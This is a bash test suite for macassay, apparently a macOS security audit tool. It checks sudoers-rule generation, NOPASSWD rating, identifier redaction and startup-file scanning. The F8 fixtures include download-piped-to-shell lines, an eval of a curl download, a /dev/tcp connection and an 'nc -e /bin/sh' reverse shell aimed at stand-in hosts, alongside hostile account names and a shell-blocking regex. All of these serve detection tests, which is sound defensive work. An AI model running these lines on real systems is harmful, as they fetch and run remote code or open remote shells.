#!/bin/bash
# Fixture tests for the logic functions in macassay. Development only; not shipped.
# Usage: dev/test.sh   (no root, no network; exits non-zero when a case fails)

cd "$(dirname "$0")/.." || exit 1
# shellcheck source=/dev/null  # the suite lints macassay on its own
MACASSAY_LIB=1 . ./macassay
T=$(mktemp -d /tmp/macassay-test.XXXXXX) || exit 1
# A watchdog stops the suite after 60 seconds, so a hang fails instead of stalling.
( sleep 60; echo "FAIL suite timed out after 60 seconds" >&2; kill -TERM $$ ) & WD=$!
trap '{ kill "$WD"; wait "$WD"; } 2>/dev/null; rm -rf "$T"' EXIT

FAILS=0
check() { local name="$1"; shift; if "$@"; then echo "ok   $name"; else echo "FAIL $name"; FAILS=$((FAILS+1)); fi; }
has()   { grep -qF -- "$2" "$1"; }
hasnt() { ! grep -qF -- "$2" "$1"; }
not()   { ! "$@"; }
visudo_ok() { /usr/sbin/visudo -c -f "$1" >/dev/null 2>&1; }

ACCTS='account root 0 /var/root
account alice 501 /Users/alice
account bob 502 /Users/bob
account _www 70 /Library/WebServer
sudoersd macassay
sudoersd extra_rules'

# F1: a normal account list gives a valid file for the granted user.
printf '%s\n' "$ACCTS" | gen_rules bob arm64 > "$T/f1" 2> "$T/f1.err"
check "F1 gen_rules exit status" [ $? -eq 0 ]
check "F1 visudo accepts the rules" visudo_ok "$T/f1"
check "F1 rules for alice" has "$T/f1" "/usr/bin/ssh-keygen -l -f /Users/alice/.ssh/authorized_keys"
check "F1 rules for root" has "$T/f1" "/bin/ls -ln /var/root/Library/LaunchAgents"
check "F1 no rules for the granted user" hasnt "$T/f1" "/Users/bob"
check "F1 no rules for system accounts" hasnt "$T/f1" "/Library/WebServer"
check "F1 sudoers.d files" has "$T/f1" "/bin/cat /etc/sudoers.d/extra_rules"
check "F1 always_set_home follows the alias" [ "$(grep -n 'Cmnd_Alias' "$T/f1" | cut -d: -f1)" -lt "$(grep -n 'always_set_home' "$T/f1" | cut -d: -f1)" ]
check "F1 grant line" has "$T/f1" "bob ALL = (root) NOPASSWD: MACASSAY"

# F2: no wildcards, no ALL in a command, no shell or interpreter, bputil only on Apple silicon.
grep '^    /' "$T/f1" > "$T/f2.cmds"
check "F2 no * in any rule" hasnt "$T/f1" "*"
check "F2 no ALL in a command" hasnt "$T/f2.cmds" "ALL"
check "F2 no shell, interpreter, editor or sqlite3" [ -z "$(awk '{print $1}' "$T/f2.cmds" | grep -E '/(ba|z|k|c|tc|da)?sh$|python|perl|ruby|osascript|vim?$|nano|emacs|sqlite3|env$')" ]
check "F2 bputil on arm64" has "$T/f1" "/usr/bin/bputil -d"
printf '%s\n' "$ACCTS" | gen_rules bob x86_64 > "$T/f2.intel" 2>/dev/null
check "F2 no bputil on Intel" hasnt "$T/f2.intel" "bputil"

# F3: hostile account names, home folders and sudoers.d names are skipped with a warning.
HOSTILE="$ACCTS
account bad,name 503 /Users/badname
account ev*l 504 /Users/evil
account dots 505 /Users/../etc
account outside 506 /tmp/x
account -dash 507 /Users/dash
account colon:x 508 /Users/c
account eq=x 509 /Users/e
account paren( 510 /Users/p
account back\\slash 511 /Users/b
account spacey 512 /Users/with space
account root 0 /Users/rootfake
sudoersd bad.name
sudoersd st*r
sudoersd br[acket
sudoersd with space"
printf '%s\n' "$HOSTILE" | gen_rules bob arm64 > "$T/f3" 2> "$T/f3.err"
check "F3 gen_rules still succeeds" [ $? -eq 0 ]
check "F3 visudo accepts the rules" visudo_ok "$T/f3"
for bad in badname evil "/Users/../etc" /tmp/x /Users/dash /Users/c /Users/e /Users/p /Users/b "with space" rootfake bad.name "st*r" "br[acket"; do
  check "F3 skips $bad" hasnt "$T/f3" "$bad"
done
check "F3 warns for each skipped item" [ "$(grep -c Skipping "$T/f3.err")" -ge 15 ]

# F4: the granted user must exist and be a regular account.
for u in root _www nosuch "bad name"; do
  printf '%s\n' "$ACCTS" | gen_rules "$u" arm64 > /dev/null 2>&1
  check "F4 refuses granted user '$u'" [ $? -ne 0 ]
done
# A name that reads as a sudoers alias, or ALL, would widen the grant line.
for u in ALL ADMIN_1; do
  printf '%s\naccount %s 503 /Users/%s\n' "$ACCTS" "$u" "$u" | gen_rules "$u" arm64 > /dev/null 2>&1
  check "F4 refuses alias-like user '$u'" [ $? -ne 0 ]
done

# F5: sudo refusals are told apart from a command's own failure.
printf 'sudo: a password is required\n' > "$T/e1"
printf "Sorry, user bob is not allowed to execute '/bin/cat /x' as root on host.\n" > "$T/e2"
printf 'sudo: /usr/bin/bputil: command not found\n' > "$T/e3"
printf 'ls: /Users/alice/.zlogin: No such file or directory\n' > "$T/e4"
: > "$T/e5"
check "F5 password required is a refusal" classify_refusal 1 "$T/e1"
check "F5 not allowed is a refusal" classify_refusal 1 "$T/e2"
check "F5 missing command is a refusal" classify_refusal 1 "$T/e3"
check "F5 command failure is not a refusal" not classify_refusal 1 "$T/e4"
check "F5 success is not a refusal" not classify_refusal 0 "$T/e5"

# F6: NOPASSWD rules are found and rated.
cat > "$T/sudoers" <<'EOF'
# alice ALL = (ALL) NOPASSWD: ALL   (a comment)
Defaults env_reset
%admin ALL = (ALL) ALL
alice ALL = (ALL) NOPASSWD: ALL
bob ALL = (root) NOPASSWD: /bin/kill
carol ALL = NOPASSWD:ALL
dave ALL = (root) NOPASSWD: ALLOWED_CMDS
erin ALL = (root) \
    NOPASSWD: ALL
Cmnd_Alias X = /bin/a, \
    /bin/b
#501 ALL = (ALL) NOPASSWD: ALL
frank ALL = (root) NOPASSWD: SETENV: ALL
gina ALL = (root) NOPASSWD:/bin/ls,ALL
#includedir /private/etc/sudoers.d
EOF
classify_sudoers < "$T/sudoers" > "$T/f6"
check "F6 six NOPASSWD: ALL rules are MEDIUM" [ "$(cut -f2 "$T/f6" | grep -c '^MEDIUM')" -eq 6 ]
check "F6 a #UID rule is not a comment" has "$T/f6" "#501 ALL = (ALL) NOPASSWD: ALL"
check "F6 two other NOPASSWD rules are LOW" [ "$(cut -f2 "$T/f6" | grep -c '^LOW')" -eq 2 ]
check "F6 IDs for the two risks" [ "$(cut -f1 "$T/f6" | sort -u | paste -sd, -)" = "MA-ACCOUNTS-005,MA-ACCOUNTS-006" ]
check "F6 continued line joined" has "$T/f6" "erin ALL = (root) NOPASSWD: ALL"
check "F6 comments, includes and Defaults ignored" [ "$(wc -l < "$T/f6" | tr -d ' ')" -eq 8 ]

# F7: allow-lists keep settings and drop identifiers.
# The bputil fixture follows real macOS 27.2 output, with identifiers replaced.
cat > "$T/bputil" <<'EOF'
OS Type                                       : macOS
Local Policy Nonce Hash                 (lpnh): 1234567890ABCDEF1234567890ABCDEF1234567890ABCDEF1234567890ABCDEF
Unique Chip ID                          (ECID): 0x123456789ABCDE
Security Mode                           (CSEC): 1
Volume Group UUID                       (vuid): 11111111-2222-3333-4444-555555555555
Security Mode:               Reduced    (smb0): 1
3rd Party Kexts Status:      Enabled    (smb2): 1
DEP-allowed MDM Control:     Enabled    (smb4): 1
SIP Status:                  Enabled    (sip0): absent
EOF
filter_bputil < "$T/bputil" > "$T/f7b"
check "F7 bputil keeps the security mode" has "$T/f7b" "Security Mode:               Reduced"
check "F7 bputil keeps SIP" has "$T/f7b" "SIP Status"
check "F7 bputil keeps kexts" has "$T/f7b" "Kexts Status"
check "F7 bputil drops UUIDs, hashes and the chip ID" [ -z "$(grep -E '1111|ABCDEF|ECID' "$T/f7b")" ]
check "F7 bputil mode from the smb0 line" [ "$(bputil_mode < "$T/bputil")" = Reduced ]
check "F7 bputil mode Full" [ "$(printf 'Security Mode                           (CSEC): 1\nSecurity Mode:               Full       (smb0): absent\n' | bputil_mode)" = Full ]
cat > "$T/profiles" <<'EOF'
There are 2 configuration profiles installed
_computerlevel[1] attribute: name: Wi-Fi
_computerlevel[1] attribute: profileIdentifier: com.example.wifi
_computerlevel[1] attribute: profileUUID: 11111111-2222-3333-4444-555555555555
_computerlevel[2] attribute: name: 22222222-3333-4444-5555-666666666666
_computerlevel[1] attribute: organization: Example
_computerlevel[1] attribute: installationDate: 2026-01-01
EOF
filter_profiles < "$T/profiles" > "$T/f7p"
check "F7 profiles keeps names, identifiers, organization" [ "$(wc -l < "$T/f7p" | tr -d ' ')" -eq 4 ]
check "F7 profiles drops UUIDs" [ -z "$(grep -E '1111|2222' "$T/f7p")" ]

# F8: startup-file matches name the pattern and never copy the line.
cat > "$T/rc" <<'EOF'
curl -s https://x.example | sh   # SECRET_TOKEN_1
export X=$(echo abc | base64 -D) SECRET_TOKEN_2
bash -c "$(curl -fsSL https://y.example)" SECRET_TOKEN_3
wget -qO- z.example | bash
cat a | bash -s
eval "$(curl q.example)"
exec 3<>/dev/tcp/192.0.2.1/80
nc -e /bin/sh h.example
osascript -e 'beep'
echo harmless
EOF
rc_hits "$T/rc" "$T/missing" > "$T/f8"
check "F8 no line text in the output" [ -z "$(grep -E 'SECRET|example|harmless' "$T/f8")" ]
for want in "1: download piped to a shell" "2: base64 decode" "3: shell running a download" "4: download piped to a shell" \
            "5: shell reading a script from a pipe" "6: eval of a download" "7: /dev/tcp connection" "8: nc with -e" "9: osascript -e"; do
  check "F8 finds $want" has "$T/f8" "$T/rc:$want"
done
check "F8 no match on a harmless line" hasnt "$T/f8" "$T/rc:10:"

# F9: SSH methods that accept a password.
check "F9 password" ssh_methods_flag "(publickey,password)"
check "F9 keyboard-interactive" ssh_methods_flag "(publickey,keyboard-interactive)"
check "F9 publickey alone" not ssh_methods_flag "(publickey)"

# F10: report text from the audited Mac stays in one cell.
# shellcheck disable=SC2016  # the backticks are literal test input
out=$(printf 'evil\nHIGH\tArea|x`y`\rz' | clean_field)
check "F10 one line" [ "$(printf '%s\n' "$out" | wc -l | tr -d ' ')" -eq 1 ]
check "F10 no tab, pipe or backtick" [ -z "$(printf '%s' "$out" | tr -d -c '\t|`')" ]
check "F10 text kept" [ "$out" = "evil HIGH Area/xy z" ]

# F11: dashed UUIDs anywhere in the report are replaced.
out=$(printf '/Library/SystemExtensions/688AE699-C0FB-4B23-91E1-6ACB69076699/x and abcdefab-cdef-abcd-efab-cdef00000050\n' | redact_ids)
check "F11 UUIDs replaced" [ "$out" = "/Library/SystemExtensions/<UUID>/x and <UUID>" ]

# F12: crontab lines show the schedule and command name, never arguments or values.
printf '%s\n' '# comment' 'API_KEY=SECRET_A' '*/5 * * * * /usr/bin/curl -H "Authorization: SECRET_B" https://x' \
  '@reboot /Users/x/bin/start.sh SECRET_C' '0 3 * * * TOKEN=SECRET_D /bin/run' | crontab_summary > "$T/f12"
check "F12 no secrets" [ -z "$(grep SECRET "$T/f12" | grep -v 'API_KEY (value hidden)')" ]
check "F12 variable named without value" has "$T/f12" "environment variable API_KEY (value hidden)"
check "F12 schedule and command" has "$T/f12" "*/5 * * * *  curl (arguments hidden)"
check "F12 @reboot entry" has "$T/f12" "@reboot  start.sh (arguments hidden)"
check "F12 inline variables hidden" has "$T/f12" "0 3 * * *  (command with inline variables) (arguments hidden)"

# F13: a program owned by this user is HIGH.
touch "$T/prog"
check "F13 user-owned program is HIGH" [ "$(chain_writable "$T/prog" | cut -f1)" = HIGH ]

# F14: a failed install rollback is reported, not claimed as restored.
mkdir "$T/sd"
sudoers_ok() { ! grep -qs BAD "$RULES"; }
( RULES="$T/sd/macassay"; TMP="$T/r1"; mkdir "$TMP"; echo BAD > "$RULES"
  rollback_rules && [ ! -e "$RULES" ] ) 2>/dev/null
check "F14 no backup: bad file removed, rollback succeeds" [ $? -eq 0 ]
( RULES="$T/sd/macassay"; TMP="$T/r2"; mkdir "$TMP"; echo BAD > "$RULES"; echo good > "$TMP/old"
  rollback_rules ) 2>/dev/null
check "F14 backup not installable: rollback returns 2" [ $? -eq 2 ]
check "F14 backup not installable: bad file removed" [ ! -e "$T/sd/macassay" ]
check "F14 no .macassay.new left behind" [ ! -e "$T/sd/.macassay.new" ]
( RULES="$T/sd/macassay"; TMP="$T/r3"; mkdir "$TMP"; sudoers_ok() { false; }; echo BAD > "$RULES"
  rollback_rules ) 2>/dev/null
check "F14 sudo still broken: rollback returns 1" [ $? -eq 1 ]

# F15: every finding call names a literal ID, or "$id" from a function that prints literal IDs, and one of the 14 section labels.
LABELS="Health Backups Updates Platform Management Sharing Network Persistence Apps Accounts Credentials Developer Trust Events"
LABRE=$(echo "$LABELS" | tr 'a-z ' 'A-Z|')
grep -v '^[[:space:]]*#' macassay | grep -oE '(^|[^A-Za-z_])finding [A-Z"$][^ ]* [^ ]+ [^ ]+' | sed -E 's/^[^f]*//' > "$T/f15"
check "F15 finding calls found" [ "$(grep -c . "$T/f15")" -ge 57 ]
check "F15 every call has a literal ID or \$id" [ -z "$(awk '$2 !~ /^(MA-[A-Z]+-[0-9][0-9][0-9]|"\$id")$/' "$T/f15")" ]
check "F15 every call names a section label" [ -z "$(awk -v l=" $LABELS " 'index(l, " " $4 " ") == 0' "$T/f15")" ]
check "F15 no flag calls left" [ -z "$(grep -v '^[[:space:]]*#' macassay | grep -E '(^|[;&|{()]|then|do|else)[[:space:]]*flag ')" ]

# F16: every ID has a section label and three digits; call sites share an ID only where listed (one risk at two severities or two places).
grep -oE 'MA-[A-Za-z]+-[0-9]+' macassay | sort > "$T/f16"
check "F16 every ID has a label and three digits" [ -z "$(grep -vxE "MA-($LABRE)-[0-9]{3}" "$T/f16")" ]
grep -oE 'finding MA-[A-Z]+-[0-9]+' macassay | sort | uniq -d > "$T/f16d"
check "F16 shared IDs are only the listed ones" [ -z "$(grep -vxE 'finding (MA-HEALTH-003|MA-SHARING-007)' "$T/f16d")" ]

echo ""
if [ "$FAILS" -eq 0 ]; then echo "All cases passed."; else echo "$FAILS case(s) failed."; exit 1; fi
